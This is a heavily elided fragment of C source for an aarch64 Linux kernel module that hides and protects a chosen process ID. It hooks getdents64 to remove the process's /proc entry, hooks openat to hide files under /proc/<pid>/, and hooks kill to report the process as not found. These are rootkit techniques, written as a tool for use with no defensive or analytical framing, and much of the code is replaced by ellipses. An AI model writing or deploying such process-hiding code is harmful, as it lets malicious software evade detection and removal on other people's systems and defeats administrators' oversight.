/*
 * hideproc_aarch64_final.c - Completely hide and protect a given PID (aarch64)
 * Features:
 *   - Hide /proc/<pid> directory (by filtering getdents64)
 *   - Hide files inside /proc/<pid>/ (by filtering openat)
 *   - Protect process from being killed (by filtering kill)
...
/* aarch64 syscall argument extraction */
...
/* Custom openat: hide files inside /proc/<pid>/ */
...
static asmlinkage long hideproc_kill(const struct pt_regs *regs)
{
    ...
    if (protected_pid && pid == protected_pid) {
        ...
        return -ESRCH;  // Process not found, consistent with hiding logic
    }
    return sys_kill_wrapper(regs);
}

/* Custom getdents64: hide PID directory entry in /proc */
static asmlinkage long hideproc_getdents64(const struct pt_regs *regs)
{
    ...
    /* Check if it's the proc filesystem */
    if (file->f_path.dentry->d_sb->s_type->name &&
        ...
        while (buf_len < ret) {
            ...
            if (*end == '\0' && pid > 0 && pid == protected_pid) {
                /* Skip this entry: move subsequent data forward */
